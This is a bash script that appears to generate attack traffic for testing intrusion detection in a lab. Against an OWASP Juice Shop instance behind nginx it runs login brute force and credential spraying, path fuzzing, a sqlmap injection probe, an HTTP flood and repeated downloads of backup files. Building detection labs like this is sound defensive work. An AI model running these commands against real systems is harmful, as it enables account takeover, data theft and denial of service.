#!/usr/bin/env bash
# attack-runner.sh — Trigger named attack scenarios against Juice Shop via nginx.
#
# Usage:
#   attack-runner <scenario> [options]
#
# Scenarios:
#   brute_force          — hydra login brute force (trips brute_force + suspicious_login)
#   credential_stuffing  — hydra fast multi-user spray (trips credential_stuffing)
#   web_scan             — ffuf path/param fuzzing (trips web_scan)
#   sqli                 — sqlmap SQL injection probe (trips web_scan)
#   http_flood           — hey HTTP load flood (trips excessive_requests + http_flood)
#   data_exfiltration    — download large files from /ftp (trips data_exfiltration)
#   full                 — run all scenarios in sequence
#
set -euo pipefail

TARGET="${TARGET:-http://nginx}"
USERS="/wordlists/users.txt"
PASSWORDS="/wordlists/passwords.txt"
PATHS="/wordlists/paths.txt"

red()   { printf '\033[1;31m%s\033[0m\n' "$*"; }
green() { printf '\033[1;32m%s\033[0m\n' "$*"; }
blue()  { printf '\033[1;34m%s\033[0m\n' "$*"; }

scenario_brute_force() {
    blue "[*] Scenario: brute_force — ffuf login brute force"
    ffuf -u "${TARGET}/rest/user/login" \
        -X POST -H "Content-Type: application/json" \
        -d '{"email":"FUZZ","password":"FUZ2"}' \
        -w "$USERS:FUZZ" -w "$PASSWORDS:FUZ2" \
        -mc all -t 4 -rate 10 \
        2>&1 || true
    green "[+] brute_force complete"
}

scenario_credential_stuffing() {
    blue "[*] Scenario: credential_stuffing — Fast multi-user spray"
    ffuf -u "${TARGET}/rest/user/login" \
        -X POST -H "Content-Type: application/json" \
        -d '{"email":"FUZZ","password":"FUZ2"}' \
        -w "$USERS:FUZZ" -w "$PASSWORDS:FUZ2" \
        -mc all -t 16 -rate 40 \
        2>&1 || true
    green "[+] credential_stuffing complete"
}

scenario_web_scan() {
    blue "[*] Scenario: web_scan — ffuf path fuzzing"
    ffuf -u "${TARGET}/FUZZ" -w "$PATHS" \
        -mc all -fc 301 \
        -t 10 -rate 20 \
        -H "User-Agent: Mozilla/5.0 (compatible; Scanner/1.0)" \
        2>&1 || true
    green "[+] web_scan complete"
}

scenario_sqli() {
    blue "[*] Scenario: sqli — sqlmap SQL injection probe"
    sqlmap -u "${TARGET}/rest/products/search?q=test" \
        --batch --level=1 --risk=1 \
        --random-agent \
        --tamper=space2comment \
        --timeout=10 \
        --retries=1 \
        2>&1 || true
    green "[+] sqli complete"
}

scenario_http_flood() {
    blue "[*] Scenario: http_flood — ab HTTP flood"
    ab -t 30 -c 50 \
        -H "User-Agent: Mozilla/5.0 (compatible; LoadBot/1.0)" \
        "${TARGET}/" \
        2>&1 || true
    green "[+] http_flood complete"
}

scenario_data_exfiltration() {
    blue "[*] Scenario: data_exfiltration — Download FTP files"
    # Hit known Juice Shop FTP files repeatedly to generate large byte transfers
    for i in $(seq 1 20); do
        curl -s -o /dev/null -w "GET /ftp/acquisitions.md -> %{http_code} (%{size_download} bytes)\n" \
            "${TARGET}/ftp/acquisitions.md" || true
        curl -s -o /dev/null -w "GET /ftp/coupons_2013.md.bak -> %{http_code} (%{size_download} bytes)\n" \
            "${TARGET}/ftp/coupons_2013.md.bak" || true
        curl -s -o /dev/null -w "GET /ftp/package.json.bak -> %{http_code} (%{size_download} bytes)\n" \
            "${TARGET}/ftp/package.json.bak" || true
    done
    green "[+] data_exfiltration complete"
}

scenario_full() {
    blue "[*] Running ALL scenarios in sequence..."
    echo ""
    scenario_brute_force
    echo ""
    sleep 5
    scenario_web_scan
    echo ""
    sleep 5
    scenario_http_flood
    echo ""
    sleep 5
    scenario_sqli
    echo ""
    sleep 5
    scenario_data_exfiltration
    echo ""
    sleep 5
    scenario_credential_stuffing
    echo ""
    green "[+] All scenarios complete."
}

usage() {
    echo "Usage: attack-runner <scenario>"
    echo ""
    echo "Scenarios:"
    echo "  brute_force          Hydra login brute force"
    echo "  credential_stuffing  Fast multi-user credential spray"
    echo "  web_scan             ffuf path/param fuzzing"
    echo "  sqli                 sqlmap SQL injection"
    echo "  http_flood           hey HTTP flood"
    echo "  data_exfiltration    Download large files from /ftp"
    echo "  full                 Run all scenarios in sequence"
    exit 1
}

if [ $# -lt 1 ]; then
    usage
fi

case "$1" in
    brute_force)          scenario_brute_force ;;
    credential_stuffing)  scenario_credential_stuffing ;;
    web_scan)             scenario_web_scan ;;
    sqli)                 scenario_sqli ;;
    http_flood)           scenario_http_flood ;;
    data_exfiltration)    scenario_data_exfiltration ;;
    full)                 scenario_full ;;
    *)                    red "Unknown scenario: $1"; usage ;;
esac
